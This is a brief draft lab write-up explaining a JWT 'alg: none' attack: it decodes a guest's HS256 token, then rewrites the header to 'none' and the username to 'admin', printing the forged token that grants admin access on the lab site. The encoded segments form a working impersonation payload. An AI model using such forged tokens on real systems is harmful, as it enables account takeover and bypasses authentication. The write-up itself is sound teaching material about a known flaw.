---
title: "JWT Token"
description: "Integrity Failure if you find any JWT Token with signing key such as i.e. HS256 you can try this for imporsonate other user. Our jwt token is the following : login as guest on a"
lang: "en"
translationKey: "jwt-token"
category: "lab-writeups"
tags: []
publishDate: "2024-08-29"
draft: true
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "624b8c28-b9cc-4288-8dbe-ee9ee8fd5afa"
notionUrl: "https://app.notion.com/p/JWT-Token-624b8c28b9cc42888dbeee9ee8fd5afa"
notionLastEdited: "2024-08-29T04:29:00.000Z"
---

# Integrity Failure

if you find any JWT Token with signing key such as (i.e. HS256) you can try this for imporsonate other user. Our jwt token is the following :

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzI0ODk5NTk0fQ.3hWqwGtmLH75cN8QAwqEnex93gCPb08BsxNIbO_UZuY

# hasil decrypt
{"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1724899594}
áZ¬¶bÇï
ñ

```

login as guest on a website :


![](/images/jwt-token/faea54d8fbc4.png)

Then we want to imporsonate as an admin try to manipulate jwt token per segment like this 

```bash
### Segment 1
#Decode :
{"typ":"JWT","alg":"none"}
#Encode :
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
### Segment 2
#Decode :
{"username":"admin","exp":1724899594}
#Encode :
eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI0ODk5NTk0fQ==

### Hasil akhir
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI0ODk5NTk0fQ==.
```

Tada we got admin!!!!

![](/images/jwt-token/162a4f8ac22b.png)
